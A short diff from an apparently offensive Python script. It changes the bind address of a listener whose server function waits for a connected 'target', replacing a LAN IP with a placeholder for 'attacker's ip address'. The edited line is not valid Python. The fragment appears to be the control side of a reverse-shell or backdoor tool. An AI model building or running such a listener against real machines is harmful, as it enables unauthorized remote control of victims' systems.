@@ -84,7 +84,7 @@ def server():
 	global target
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	s.bind(("192.168.0.101", 54321))
+	s.bind(("Here Goes your(attacker's ip address)", port number(eg,8080)))
 	s.listen(5)
 	print("Listening For Incoming Connections[+]")
 	target, ip = s.accept()
